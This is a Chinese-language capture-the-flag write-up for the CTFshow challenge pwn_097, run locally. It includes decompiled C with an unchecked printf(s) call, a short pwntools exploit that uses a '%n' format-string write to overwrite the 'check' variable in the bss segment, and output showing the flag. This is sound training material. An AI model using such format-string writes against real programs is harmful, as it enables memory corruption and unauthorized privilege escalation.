# CTFshow-pwn_097
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（任意写）
## 解题思路
> 格式化字符串覆盖 bss 段变量

仅开启 NX 和 Canary  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_097
[*] '/home/mrw/CTFshow/pwn_097'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

程序的伪代码如下  
```c
int flag()
{
  FILE *stream; // [esp+8h] [ebp-40h]
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory");
    exit(0);
  }
  fgets(s, 48, stream);
  printf("%s", s);
  return 0;
}
int get_flag()
{
  if ( !check )
    return puts("Permission denied.");
  puts("Your privileges have been elevated to 'root'.\n#cat /ctfshow_flag");
  return flag();
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+10h] [ebp-4Ch] BYREF
  unsigned int v5; // [esp+50h] [ebp-Ch]
  int *p_argc; // [esp+54h] [ebp-8h]

  p_argc = &argc;
  v5 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  puts(
    "    鈻勨杽鈻勨杽   鈻勨杽鈻勨杽鈻勨杽鈻勨杽  鈻勨杽鈻勨杽鈻勨杽鈻勨杽            鈻勨杽                           ");
  puts(asc_8048AD8);
  puts(
    " 鈻堚枅鈻€          鈻堚枅     鈻堚枅        鈻勨杽鈻堚枅鈻堚枅鈻堚杽  鈻堚枅鈻勨枅鈻堚枅鈻堚杽   鈻勨枅鈻堚枅鈻堚杽  鈻堚枅      鈻堚枅");
  puts(asc_8048BE0);
  puts(asc_8048C70);
  puts(asc_8048CF4);
  puts(
    "    鈻€鈻€鈻€鈻€      鈻€鈻€     鈻€鈻€         鈻€鈻€鈻€鈻€鈻€鈻€   鈻€鈻€    鈻€鈻€    鈻€鈻€鈻€鈻€     鈻€鈻€  鈻€鈻€  ");
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Format_String                                           ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : Find a way to elevate your privileges!                  ");
  puts("    * *************************************                           ");
  puts("You can use two command('cat /ctfshow_flag' && 'shutdown')");
  putchar(36);
  fgets(s, 64, stdin);
  if ( strstr(s, "shutdown") )
  {
    puts("See you~");
    exit(1);
  }
  if ( !strstr(s, "cat /ctfshow_flag") )
  {
    puts("Here you are:\n");
    printf(s);
  }
  get_flag();
  return 0;
}
```
- 可以发现我们覆写 bss 段上的 check 变量就可以输出 flag
- 经调试，输入内容起始处为第11个参数

**exp如下**
```python
from pwn import *
p = process('./pwn_097')
gdb.attach(p)
p.sendline(b'%1c%13$n' + p32(0x0804b040))
p.interactive()
```
## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_097.py
[+] Starting local process './pwn_097': pid 28237
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_097', '28237']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Format_String                                           
    * Site  : https://ctf.show/                                       
    * Hint  : Find a way to elevate your privileges!                  
    * *************************************                           
You can use two command('cat /ctfshow_flag' && 'shutdown')
$Here you are:

\xbd@\xb0\x0
Your privileges have been elevated to 'root'.
#cat /ctfshow_flag
flag{Success!}
[*] Got EOF while reading in interactive
$  
```
